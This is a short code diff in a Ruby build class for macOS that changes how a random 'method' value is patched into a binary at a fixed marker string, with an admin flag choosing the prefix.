@@ -39,11 +39,9 @@ class BuildOSX < Build
       begin
         method = params['admin'] ? 'Ah57K' : 'Ah56K'
         method += SecureRandom.random_bytes(27)
-        content['iuherEoR93457dFADfasDjfNkA7Txmkl'] = method
+        content.binary_patch 'iuherEoR93457dFADfasDjfNkA7Txmkl', method
       rescue
         raise "Working method marker not found"
-      ensure
-        content
       end
     end
 
